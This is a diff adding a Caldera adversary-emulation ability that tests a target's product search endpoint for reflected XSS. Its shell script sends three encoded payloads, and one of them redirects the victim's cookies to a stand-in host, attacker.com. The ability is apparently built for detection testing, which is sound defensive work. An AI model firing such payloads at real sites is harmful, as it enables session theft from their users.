@@ -1,0 +1,41 @@
+- id: d1a2b3c4-5e6f-7a8b-9c0d-e1f2a3b4c5d6
+  name: Reflected XSS - Search Parameter Script Injection
+  description: 검색 파라미터에 <script> 태그를 삽입하여 Reflected XSS를 시도합니다. 서버가 입력값을 이스케이프하지 않고 응답에 포함하면 스크립트가 실행됩니다. OWASP A03:2021 Injection / CWE-79 대응 탐지 테스트입니다.
+  tactic: initial-access
+  technique:
+    attack_id: T1059.007
+    name: 'Command and Scripting Interpreter: JavaScript'
+  platforms:
+    linux:
+      sh:
+        command: |-
+          OP_ID="#{operation_id}"
+          TECH_ID="T1059.007"
+          ABILITY_ID="d1a2b3c4-5e6f-7a8b-9c0d-e1f2a3b4c5d6"
+          TARGET="http://#{target.url}"
+
+          XSS_PAYLOADS=(
+            "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"
+            "%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E"
+            "%22%3E%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fattacker.com%2F%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E"
+          )
+
+          LABELS=(
+            "Basic <script>alert('XSS')</script>"
+            "IMG onerror handler"
+            "Cookie exfiltration via redirect"
+          )
+
+          for i in "${!XSS_PAYLOADS[@]}"; do
+            echo "[*] Reflected XSS Attempt $((i+1)): ${LABELS[$i]}"
+            RESULT=$(curl -s -o /dev/null -w "%{http_code}" \
+              -H "X-Caldera-Op-Id: ${OP_ID}" \
+              -H "X-Caldera-Technique: ${TECH_ID}" \
+              -H "X-Caldera-Ability: ${ABILITY_ID}" \
+              -A "Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}" \
+              "${TARGET}/api/products/search?keyword=${XSS_PAYLOADS[$i]}")
+            echo "[+] HTTP ${RESULT}"
+          done
+        parsers:
+          plugins.stockpile.app.parsers.basic:
+          - source: host.vuln.xss
